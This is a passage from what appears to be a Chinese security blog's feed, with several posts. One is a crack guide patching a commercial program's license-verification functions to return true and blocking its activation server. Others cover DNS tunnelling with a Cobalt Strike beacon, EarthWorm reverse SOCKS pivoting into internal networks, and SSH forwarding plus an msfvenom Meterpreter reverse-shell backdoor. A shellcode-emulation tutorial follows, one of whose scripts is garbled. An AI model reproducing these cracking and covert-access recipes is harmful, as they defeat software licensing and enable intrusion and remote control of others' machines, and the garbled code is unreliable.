<p><code>this.method_7</code> 最终调用的也是 <code>WSProductReg.Verify</code>,这个函数最终调用了<code>WSProductReg.Class12.smethod_0</code><br><img src="http://oy9h5q2k4.bkt.clouddn.com/1517645857765j01gzo6f.png?imageslim" alt="paste image"></p>
<p> <code>WSProductReg.Class12.smethod_0</code>  才是真正的 校验函数，于是修改掉他的返回值。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">	// Token: 0x060003FF RID: 1023</div><div class="line">internal static bool smethod_0(uint uint_0, uint uint_1, string string_0, string string_1, string string_2, string string_3)</div><div class="line">&#123;</div><div class="line">	return true;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p> 为了保持修改，需要先关掉程序，然后使用 <code>dnspy</code> 的保存功能即可。</p>
<p> <img src="http://oy9h5q2k4.bkt.clouddn.com/1517646075076plyvqwrg.png?imageslim" alt="paste image"></p>
<p> 重启程序，随便输入 序列号 和 邮箱</p>
<p> <img src="http://oy9h5q2k4.bkt.clouddn.com/1517646144898gk2awx63.png?imageslim" alt="paste image"></p>
<p> 但是会提示</p>
<p> <img src="http://oy9h5q2k4.bkt.clouddn.com/151764620318152bf08bb.png?imageslim" alt="paste image"></p>
<p> 估计是他有在线校验，断网使用就没问题了。最后使用了 <code>idea</code> 破解一样的办法，抓到 验证包， 修改 <code>host</code> 是他无法验证。</p>
<p> <img src="http://oy9h5q2k4.bkt.clouddn.com/151764631362740ers5gm.png?imageslim" alt="paste image"></p>
<p> 然后把这个 <code>0.0.0.0 platform.wondershare.com</code> 放到 <code>host</code> 文件里面。</p>
<p> 然后应该就没有问题了。</p>
<p> <strong>6.4最新版破解</strong></p>
<p> 最新版连混淆都没有，逻辑更加的清晰。</p>
<p> <img src="http://oy9h5q2k4.bkt.clouddn.com/15176467493903918z8t3.png?imageslim" alt="paste image"></p>
<p> 调试找到了 <code>6.0</code> 中的相对应的 校验函数 <code>WSProductReg.RSAKeyCodec.VerifySN</code></p>
<p> <img src="http://oy9h5q2k4.bkt.clouddn.com/1517646888263emgkdxth.png?imageslim" alt="paste image"></p>
<p> 修改掉<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"> internal static bool VerifySN(uint n, uint d, string sn, string email, string product, string version)</div><div class="line">&#123;</div><div class="line">    return true;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p> 同时还找到了 在线校验的函数<code>ProductClient.RegCheck</code></p>
<p> <img src="http://oy9h5q2k4.bkt.clouddn.com/1517647117772z3l9r6ka.png?imageslim" alt="paste image"></p>
<p> 修改</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">	public static bool RegCheck(string Email, string LangID, RegCheckType CheckType)</div><div class="line">&#123;</div><div class="line">	return true;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p> 即可。</p>
]]></content>
      
        <categories>
            
            <category> 破解 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> c#破解 </tag>
            
            <tag> dnSpy </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[DNS隧道实战&&cobaltstrike利用dns隧道]]></title>
      <url>/2018/01/29/dns_tunnel_and_cobaltstrike.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>使用 <code>dns</code> 隧道进行 <code>tcp</code> 通信。</p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>首先配置域名<br><img src="http://oy9h5q2k4.bkt.clouddn.com/15172148015952uy4uray.png?imageslim" alt="paste image"><br>配置一个 <code>A</code> 记录指向我们的 <code>vps</code>, 然后配置几个 <code>ns</code> 记录，指向刚刚设置的 <code>A</code> 记录</p>
<p>然后在服务端安装</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">wget https://launchpad.net/ubuntu/+archive/primary/+files/dns2tcp_0.5.2.orig.tar.gz</div><div class="line">tar xvf dns2tcp_0.5.2.orig.tar.gz </div><div class="line">cd dns2tcp-0.5.2/</div><div class="line">./configure </div><div class="line">make</div><div class="line">sudo make install</div></pre></td></tr></table></figure>
<p>新建一个配置文件</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1517215201286y5cu2j3q.png?imageslim" alt="paste image"></p>
<p>然后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">dns2tcpd -f my.conf -F -d 2</div></pre></td></tr></table></figure></p>
<p>接着在客户端  也安装好。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">dns2tcpc -r socks -z ns10.hac425.top vps_ip -l 8888 -d 2</div></pre></td></tr></table></figure>
<p>然后访问 <code>B:8888</code>  —&gt;  <code>vps_ip:1082</code></p>
<p><strong>cobaltstrike</strong></p>
<p>把下好的 <code>cobaltstrike</code> 传到 <code>vps</code>, 装好 <code>jdk</code>, 运行 <code>./teamserver vps_ip password</code><br><img src="http://oy9h5q2k4.bkt.clouddn.com/1517215742775dhwda0r3.png?imageslim" alt="paste image"></p>
<p>然后本地运行 <code>cobaltstrike.jar</code>, 连接上去，用户名随便写，密码就是运行 <code>teamserver</code> 设置的 <code>password</code>, 在这里就是 <code>1234</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/151721591922608ib7g6k.png?imageslim" alt="paste image"></p>
<p>首先新建一个 <code>listener</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1517215994257ia7ltvgn.png?imageslim" alt="paste image"></p>
<p>host就是 vps的 ip</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1517216014106wl2ef6b8.png?imageslim" alt="paste image"><br>填写设置好 <code>ns</code> 记录的 域名，以 <code>,</code>  分割</p>
<p>然后新建 <code>payload</code><br><img src="http://oy9h5q2k4.bkt.clouddn.com/15172160811438a91f4lb.png?imageslim" alt="paste image"></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1517216117092996s1kwu.png?imageslim" alt="paste image"></p>
<p>生成文件，运行，过一会儿应该就有了。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1517216212117wldi6k2d.png?imageslim" alt="paste image"></p>
<p>此时还得等一会（ <code>dns</code> 比较慢）<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1517216409998fpale0vr.png?imageslim" alt="paste image"></p>
<p>变成这个样子就可以进行操作了。</p>
]]></content>
      
        <categories>
            
            <category> 渗透测试 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> DNS隧道 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ew代理实战]]></title>
      <url>/2018/01/29/ew_use.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>渗透内网代理必不可少，本文做个记录</p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>工具下载地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://rootkiter.com/EarthWorm/</div></pre></td></tr></table></figure>
<p><strong>ssocksd开启 socks5 代理</strong></p>
<p>环境<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">代理：192.168.211.131</div></pre></td></tr></table></figure></p>
<p>首先使用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./ew_for_linux64 -s ssocksd -l 12345</div></pre></td></tr></table></figure>
<p>在  <code>192.168.211.131:12345</code> 开启了 <code>socks5</code> 代理，设置 <code>proxifier</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1517208105076mjnzg890.png?imageslim" alt="paste image"></p>
<p>然后在  <code>192.168.211.131</code> 上监听一个端口， 在 <code>192.168.211.1</code> 使用代理连过去。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1517208193383wnwp9ord.png?imageslim" alt="paste image"><br>可以看到 在 <code>192.168.211.131</code> 收到的连接是由代理服务器 <code>192.168.211.131</code> 发起的</p>
<p><strong>反弹 socks5 代理到公网vps</strong></p>
<p>此时我们可以访问 公网vps, 通过在内网主机反弹 <code>socks5</code> 到公网，然后使用公网的 <code>socks5</code> 服务，连入内网。</p>
<p>首先在公网主机</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">./ew_for_linux64 -s rcsocks -l 1080 -e 8888</div><div class="line"></div><div class="line">-l  本地监听端口，待会连接这个端口作为 socks5 端口</div><div class="line">-e  反弹中转端口</div></pre></td></tr></table></figure>
<p>在内网主机</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">./ew_for_linux64 -s rssocks -d vps_ip -e 8888</div><div class="line"></div><div class="line">-d 指定反弹的主机，这里为 公网 vps 的 ip</div><div class="line">-e 指定反弹中转端口，和vps中的设置的一样</div></pre></td></tr></table></figure>
<p>此时 <code>vps_ip:1080</code> 开启了 <code>socks5</code> 代理，设置 <code>proxifier</code><br><img src="http://oy9h5q2k4.bkt.clouddn.com/15172089986876saiwn28.png?imageslim" alt="paste image"><br>此时通过代理访问</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1517209095968899s55qo.png?imageslim" alt="paste image"></p>
<p><strong>利用lcx_tran端口转发转接socks代理</strong></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1517209790860q4hk9v5w.png?imageslim" alt="paste image"><br>通过 <code>192.168.211.131</code> 的 <code>1088</code> 端口使用 <code>192.168.211.132</code> 在 <code>9999</code> 端口提供的 <code>socks5</code> 代理。</p>
<p>在 <code>192.168.211.131</code> 执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">./ew_for_linux64 -s lcx_tran -l 1088 -f 192.168.211.132 -g 9999</div><div class="line"></div><div class="line">将来自 1088 的数据转发至 192.168.211.132:9999</div></pre></td></tr></table></figure>
<p>在 <code>192.168.211.132</code> 执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ew_for_Win.exe -s ssocksd -l 9999</div></pre></td></tr></table></figure></p>
<p>然后使用 <code>192.168.211.131:1088</code> 作为 <code>socks5</code> 代理即可</p>
<p><strong> lcx_slave 反向端口转发</strong></p>
<p>使用 <code>lcx_slave</code> 实现将内网端口映射到公网。</p>
<p>首先在公网主机</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">./ew_for_linux64 -s lcx_listen -l 12234 -e 8989</div><div class="line"></div><div class="line">lcx_listen 本地端口转发，将 12234 转发到 8989</div></pre></td></tr></table></figure>
<p>然后在内网主机</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ew_for_Win.exe -s lcx_slave -d vps_ip -e 8989 -f 127.0.0.1 -g 9999</div><div class="line"></div><div class="line">lcx_slave 将 vps_ip:8989 的数据转发至   127.0.0.1:9999</div></pre></td></tr></table></figure>
<p>然后访问 <code>vps_ip:12234</code> 就是访问 <code>内网主机ip:9999</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">【参数说明】</div><div class="line"></div><div class="line">ssocksd 本地 socks代理</div><div class="line">rssocks 反弹 socks代理</div><div class="line"></div><div class="line">lcx_slave  将远程主机的端口 与 另一台主机建立联系</div><div class="line">lcx_tran  将本地端口转发至远程主机</div><div class="line">lcx_listen 本地端口转发，本地端口之间建立转发关系</div></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> 渗透测试 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 端口转发 </tag>
            
            <tag> ew </tag>
            
            <tag> 代理 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[SSH反向代理转发至内网msf]]></title>
      <url>/2018/01/28/ssh_to_msf.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>买了个便宜的 <code>vps</code> , 在上面装 <code>msf</code> 也装不上，于是想着把端口映射到内网来。</p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>拓扑如下：</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15171288094759demmuh7.png?imageslim" alt="paste image"></p>
<p>首先在内网主机 <code>B</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh -fCNR 7281:localhost:5000 root@C_IP</div></pre></td></tr></table></figure>
<p>执行完后会把 <code>B:5000</code> 反弹到 <code>C_IP:7281</code>.此时 <code>C</code> 监听 <code>127.0.0.1:7281</code></p>
<p>然后然后在 公网中转服务器 <code>C</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ssh -fCNL *:5586:localhost:7281 localhost</div><div class="line"></div><div class="line">将*:5586---&gt;localhost:7281</div></pre></td></tr></table></figure>
<p>此时 <code>C</code>监听 <code>0.0.0.0:5586</code>, 并将<code>0.0.0.0:5586</code>的数据转发至 <code>localhost:7281</code></p>
<p>连接  <code>C_IP:5586</code>  就是连接  <code>B_IP:5000</code></p>
<p>然后使用 <code>msf</code> 生成后门，反弹到 <code>C_IP:5586</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=C_IP LPORT=5586 -f exe &gt; /data/test.exe</div></pre></td></tr></table></figure></p>
<p>然后在内网主机 <code>B</code> 设置好 <code>handler</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">msf &gt; use exploit/multi/handler </div><div class="line">msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp</div><div class="line">^[[A^[[Apayload =&gt; windows/meterpreter/reverse_tcp</div><div class="line">msf exploit(handler) &gt; set lport 5000</div><div class="line">lport =&gt; 5000</div><div class="line">msf exploit(handler) &gt; set lhost 0.0.0.0</div><div class="line">lhost =&gt; 0.0.0.0</div><div class="line">msf exploit(handler) &gt; show options </div><div class="line">Module options (exploit/multi/handler):</div><div class="line"></div><div class="line">   Name  Current Setting  Required  Description</div><div class="line">   ----  ---------------  --------  -----------</div><div class="line"></div><div class="line">Payload options (windows/meterpreter/reverse_tcp):</div><div class="line"></div><div class="line">   Name      Current Setting  Required  Description</div><div class="line">   ----      ---------------  --------  -----------</div><div class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &apos;&apos;, seh, thread, process, none)</div><div class="line">   LHOST     0.0.0.0          yes       The listen address</div><div class="line">   LPORT     5000             yes       The listen port</div><div class="line"></div><div class="line">Exploit target:</div><div class="line"></div><div class="line">   Id  Name</div><div class="line">   --  ----</div><div class="line">   0   Wildcard Target</div><div class="line"></div><div class="line">msf exploit(handler) &gt; exploit </div><div class="line">[*] Started reverse TCP handler on 0.0.0.0:5000</div></pre></td></tr></table></figure>
<p>运行，数据流如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">A --&gt; C_IP:5586 ---&gt;  C_IP:7281 ---&gt; B_IP:5000</div></pre></td></tr></table></figure></p>
<p><code>vultr</code>默认开启了 <code>iptables</code> 先 <code>iptables -F</code> 清理才能访问端口。</p>
]]></content>
      
        <categories>
            
            <category> 渗透测试 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ssh端口转发 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[unicorn模拟执行学习]]></title>
      <url>/2018/01/17/learn_unicorn.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><code>unicorn</code> 是一个模拟执行软件，用于模拟执行各种平台的二进制文件，前几天在  <code>twitter</code> 上看到一篇文章，这里做个记录。</p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p><strong>记录系统调用</strong></p>
<p>首先是一个简单的示例</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">e8ffffffffc05d6a055b29dd83c54e89e96a02030c245b31d266ba12008b39c1e710c1ef1081e9feffffff8b4500c1e010c1e81089c309fb21f8f7d021d86689450083c5024a85d20f85cfffffffec37755d7a0528ed24ed24ed0b887feb509838f95c962b9670fec6ffc6ff9f321f581e00d380</div></pre></td></tr></table></figure>
<p>这是一段 <code>x86_32</code> 的  <code>shellcode</code>，可以用 <code>radare2</code> 反汇编它</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rasm2 -a x86 -b 32 -d e8ffffffffc05d6a055b29dd83c54e89e96a02030c245b31d266ba12008b39c1e710c1ef1081e9feffffff8b4500c1e010c1e81089c309fb21f8f7d021d86689450083c5024a85d20f85cfffffffec37755d7a0528ed24ed24ed0b887feb509838f95c962b9670fec6ffc6ff9f321f581e00d380</div></pre></td></tr></table></figure>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1516151145858iitndxo4.png?imageslim" alt="paste image"></p>
<p>这里的目标是记录他的系统调用，在 <code>32</code> 中使用 <code>int 80</code> 来执行系统调用，所以我们在 执行 <code>int 80</code>  前 记录它的 寄存器信息，就可以记录系统调用了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">from unicorn import *</div><div class="line">from unicorn.x86_const import *</div><div class="line"></div><div class="line"></div><div class="line">shellcode = &quot;e8ffffffffc05d6a055b29dd83c54e89e96a02030c245b31d266ba12008b39c1e710c1ef1081e9feffffff8b4500c1e010c1e81089c309fb21f8f7d021d86689450083c5024a85d20f85cfffffffec37755d7a0528ed24ed24ed0b887feb509838f95c962b9670fec6ffc6ff9f321f581e00d380&quot;.decode(&quot;hex&quot;)</div><div class="line"></div><div class="line">BASE = 0x400000</div><div class="line">STACK_ADDR = 0x0</div><div class="line">STACK_SIZE = 1024*1024</div><div class="line"></div><div class="line">mu = Uc (UC_ARCH_X86, UC_MODE_32)</div><div class="line"></div><div class="line">mu.mem_map(BASE, 1024*1024)</div><div class="line">mu.mem_map(STACK_ADDR, STACK_SIZE)</div><div class="line"></div><div class="line"></div><div class="line">mu.mem_write(BASE, shellcode)</div><div class="line">mu.reg_write(UC_X86_REG_ESP, STACK_ADDR + STACK_SIZE/2)</div><div class="line"></div><div class="line">def syscall_num_to_name(num):</div><div class="line">    syscalls = &#123;1: &quot;sys_exit&quot;, 15: &quot;sys_chmod&quot;&#125;</div><div class="line">    return syscalls[num]</div><div class="line"></div><div class="line">def hook_code(mu, address, size, user_data):</div><div class="line">    #print(&apos;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&apos; %(address, size))  </div><div class="line">    </div><div class="line">    machine_code = mu.mem_read(address, size)</div><div class="line">    if machine_code == &quot;\xcd\x80&quot;:</div><div class="line">        </div><div class="line">        r_eax = mu.reg_read(UC_X86_REG_EAX)</div><div class="line">        r_ebx = mu.reg_read(UC_X86_REG_EBX)</div><div class="line">        r_ecx = mu.reg_read(UC_X86_REG_ECX)</div><div class="line">        r_edx = mu.reg_read(UC_X86_REG_EDX)</div><div class="line">        syscall_name = syscall_num_to_name(r_eax)</div><div class="line">        </div><div class="line">        print &quot;--------------&quot;</div><div class="line">        print &quot;We intercepted system call: &quot;+syscall_name</div><div class="line">        </div><div class="line">        if syscall_name == &quot;sys_chmod&quot;:</div><div class="line">            s = mu.mem_read(r_ebx, 20).split(&quot;\x00&quot;)[0]</div><div class="line">            print &quot;arg0 = 0x%x -&gt; %s&quot; % (r_ebx, s)</div><div class="line">            print &quot;arg1 = &quot; + oct(r_ecx)</div><div class="line">        elif syscall_name == &quot;sys_exit&quot;:</div><div class="line">            print &quot;arg0 = &quot; + hex(r_ebx)</div><div class="line">            exit()</div><div class="line">        </div><div class="line">        mu.reg_write(UC_X86_REG_EIP, address + size)</div><div class="line">        </div><div class="line">mu.hook_add(UC_HOOK_CODE, hook_code)</div><div class="line"></div><div class="line">mu.emu_start(BASE, BASE-1)</div></pre></td></tr></table></figure>
<p>关键就是使用 <code>mu.hook_add</code>, 使得在 <code>unicorn</code> 执行一条指令之前会先执行 <code>hook_code</code> 并且传入了与程序运行状态相关的参数，便于我们对程序状态进行操纵。在这里就是获取了 寄存器的值，然后根据系统调用号解析参数。</p>
<p><strong>arm代码模拟执行</strong></p>
<p>测试程序位于<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://t.cn/RQ6viS6</div></pre></td></tr></table></figure></p>
<p>其实就是执行一个递归函数，最后打印返回值</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1516152300740ox94gbho.png?imageslim" alt="paste image"></p>
<p>我们的目标是加速程序的执行，可以加速的原理在于，这里是递归调用，对于的参数，返回值确定，所以我们就可以对已经执行过的参数，直接设置返回值，进而加速程序的运行。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line">from unicorn import *</div><div class="line">from unicorn.arm_const import *</div><div class="line">import struct</div><div class="line"></div><div class="line">def read(name):</div><div class="line">    with open(name) as f:</div><div class="line">        return f.read()</div><div class="line">        </div><div class="line">def u32(data):</div><div class="line">    return struct.unpack(&quot;I&quot;, data)[0]</div><div class="line">    </div><div class="line">def p32(num):</div><div class="line">    return struct.pack(&quot;I&quot;, num)</div><div class="line"></div><div class="line"></div><div class="line">mu = Uc(UC_ARCH_ARM, UC_MODE_LITTLE_ENDIAN)</div><div class="line"></div><div class="line"></div><div class="line">BASE = 0x10000</div><div class="line">STACK_ADDR = </div><div class="line">STACK_SIZE = 1024*10240x300000</div><div class="line"></div><div class="line">mu.mem_map(BASE, 1024*1024)</div><div class="line">mu.mem_map(STACK_ADDR, STACK_SIZE)</div><div class="line"></div><div class="line"></div><div class="line">mu.mem_write(BASE, read(&quot;./task4&quot;))</div><div class="line">mu.reg_write(UC_ARM_REG_SP, STACK_ADDR + STACK_SIZE/2)</div><div class="line"></div><div class="line">instructions_skip_list = []</div><div class="line"></div><div class="line">CCC_ENTRY = 0x000104D0</div><div class="line">CCC_END = 0x00010580</div><div class="line"></div><div class="line">stack = []                                          # Stack for storing the arguments</div><div class="line">d = &#123;&#125;                                              # Dictionary that holds return values for given function arguments </div><div class="line"></div><div class="line">def hook_code(mu, address, size, user_data):  </div><div class="line">    #print(&apos;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&apos; %(address, size))</div><div class="line">    if address == CCC_ENTRY:                        # Are we at the beginning of ccc function?</div><div class="line">        arg0 = mu.reg_read(UC_ARM_REG_R0)           # Read the first argument. it is passed by R0</div><div class="line">        </div><div class="line">        if arg0 in d:                               # Check whether return value for this function is already saved.</div><div class="line">            ret = d[arg0]</div><div class="line">            mu.reg_write(UC_ARM_REG_R0, ret)        # Set return value in R0</div><div class="line">            mu.reg_write(UC_ARM_REG_PC, 0x105BC)    # Set PC to point at &quot;BX LR&quot; instruction. We want to return from fibonacci function</div><div class="line">            </div><div class="line">        else:</div><div class="line">            stack.append(arg0)                      # If return value is not saved for this argument, add it to stack.</div><div class="line">        </div><div class="line">    elif address == CCC_END:</div><div class="line">        arg0 = stack.pop()                          # We know arguments when exiting the function</div><div class="line">        </div><div class="line">        ret = mu.reg_read(UC_ARM_REG_R0)            # Read the return value (R0)</div><div class="line">        d[arg0] = ret                               # Remember the return value for this argument</div><div class="line">        </div><div class="line">mu.hook_add(UC_HOOK_CODE, hook_code)</div><div class="line">mu.emu_start(0x00010584, 0x000105A8)</div><div class="line">return_value = mu.reg_read(UC_ARM_REG_R1)           # We end the emulation at printf(&quot;%d\n&quot;, ccc(x)).</div><div class="line">print &quot;The return value is %d&quot; % return_value</div></pre></td></tr></table></figure>
<p>关键点，用一个数组存储了 <code>参数：返回值</code> 对， 从而规避一些冗余的运算。</p>
<p><strong>参考</strong></p>
<p><a href="http://eternal.red/2018/unicorn-engine-tutorial/" target="_blank" rel="external">http://eternal.red/2018/unicorn-engine-tutorial/</a></p>
]]></content>
      
        <categories>
            
            <category> reverse </category>
            
        </categories>
        
        
        <tags>
            
            <tag> unicorn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Pwn with File结构体（四）]]></title>
      <url>/2018/01/13/pwn_with_file_part4.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>前面几篇文章说道，<code>glibc 2.24</code> 对 <code>vtable</code> 做了检测，导致我们不能通过伪造 <code>vtable</code> 来执行代码。今天逛 <code>twitter</code> 时看到了一篇通过绕过 对<code>vtable</code> 的检测 来执行代码的文章，本文做个记录。</p>
<p>文中涉及的代码，libc, 二进制文件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://gitee.com/hac425/blog_data/blob/master/pwn_file/file_struct_part4.rar</div></pre></td></tr></table></figure>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>首先还是编译一个有调试符号的 <code>glibc</code> 来辅助分析。</p>
<p>源码下载链接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://mirrors.ustc.edu.cn/gnu/libc/glibc-2.24.tar.bz2</div></pre></td></tr></table></figure></p>
<p>可以参考<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://blog.csdn.net/mycwq/article/details/38557997</div></pre></td></tr></table></figure></p>
